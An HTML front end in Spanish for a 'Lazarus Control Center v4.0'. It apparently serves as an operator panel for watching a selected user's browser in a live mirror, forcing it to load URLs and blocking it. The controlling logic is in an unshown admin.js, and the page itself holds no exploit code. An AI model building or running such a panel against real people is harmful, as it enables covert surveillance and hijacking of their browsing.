<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Lazarus Control Center v4.0</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 350px; border-right: 1px solid #00ff41; background: #0a0a0a; display: flex; flex-direction: column; }
        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; background: #000; }
        .monitor-frame { flex: 1; border: 2px solid #00ff41; border-radius: 12px; background: #fff; overflow: hidden; position: relative; }
        iframe { width: 100%; height: 100%; border: none; }
        
        .user-box { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; }
        .user-box:hover, .user-box.active { background: #00ff41; color: #000; }
        .btn { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #00ff41; background: none; color: #00ff41; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #00ff41; color: #000; }
        .btn-danger { border-color: red; color: red; }
        .btn-danger:hover { background: red; color: white; }
    </style>
</head>
<body>

<div class="sidebar">
    <div style="padding: 20px; border-bottom: 2px solid #00ff41;">
        <h2>LAZARUS v4</h2>
        <p id="stats">Escaneando red...</p>
    </div>
    <div id="user-list" style="overflow-y: auto; flex: 1;"></div>
</div>

<div class="main">
    <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
        <h3 id="target-name">SIN SELECCIÓN</h3>
        <button class="btn" style="width: auto; padding: 5px 20px;" onclick="location.reload()">REFRESCAR PANEL</button>
    </div>
    <div class="monitor-frame">
        <iframe id="live-mirror" src="about:blank"></iframe>
    </div>
    <div style="margin-top: 15px; display: flex; gap: 20px;">
        <div style="flex: 1;">
            <input type="text" id="goto-url" placeholder="Forzar URL..." style="width: 100%; padding: 10px; background: #111; color: lime; border: 1px solid #333;">
            <button class="btn" onclick="exec('GOTO')">EJECUTAR NAVEGACIÓN FORZADA</button>
        </div>
        <div style="flex: 1;">
            <button class="btn btn-danger" onclick="exec('BAN')">BLOQUEO TOTAL</button>
            <button class="btn" onclick="exec('UNBAN')">DESBLOQUEAR</button>
        </div>
    </div>
</div>

<script src="admin.js"></script>
</body>
</html>
